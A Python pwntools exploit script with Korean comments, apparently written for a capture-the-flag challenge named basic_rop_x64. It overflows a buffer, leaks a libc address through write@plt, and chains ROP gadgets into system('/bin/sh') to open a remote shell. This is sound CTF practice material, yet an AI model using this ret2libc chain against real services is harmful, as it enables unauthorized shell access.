#리턴주소를 조작해 함수를 실행하는 기법
from pwn import *

def slog(symbol, addr):
    return success(symbol + ": " + hex(addr))

#context.log_level = 'debug'

p = remote('Host', number) #할당되는 vm 넣어야함
#p = process("./basic_rop_x64")
e = ELF("./basic_rop_x64") # 파일 이름에 따라 다름
#libc = e.libc
libc = ELF("./libc.so.6", checksec=False) # 파일 이름에 따라 다름
r = ROP(e)

read_plt = e.plt["read"]
read_got = e.got["read"]
write_plt = e.plt["write"]
write_got = e.got["write"]
main = e.symbols["main"]

read_offset = libc.symbols["read"]
system_offset = libc.symbols["system"]
sh = list(libc.search(b"/bin/sh"))[0]

pop_rdi = r.find_gadget(['pop rdi', 'ret'])[0]
pop_rsi_r15 = r.find_gadget(['pop rsi', 'pop r15', 'ret'])[0]

# Stage 1
payload:bytes = b'A' * 0x48

# write(1, read@got, 8)
payload += p64(pop_rdi) + p64(1)
payload += p64(pop_rsi_r15) + p64(read_got) + p64(8)
payload += p64(write_plt)

# return to main
payload += p64(main)

p.send(payload)

p.recvuntil(b'A' * 0x40)  # 버퍼 크기 다를 수 있음(문제 by 문제)
read = u64(p.recvn(6)+b'\x00'*2)
lb = read - read_offset
system = lb + system_offset
binsh = sh + lb

slog("read", read)
slog("libc base", lb)
slog("system", system)
slog("/bin/sh", binsh)

# Stage 2
payload: bytes = b'A' * 0x48   # 버퍼 크기 다를 수 있음(문제 by 문제)

# system("/bin/sh")
payload += p64(pop_rdi) + p64(binsh)
payload += p64(system)

p.send(payload)
p.recvuntil(b'A' * 0x40)  # 버퍼 크기 다를 수 있음(문제 by 문제)

p.interactive()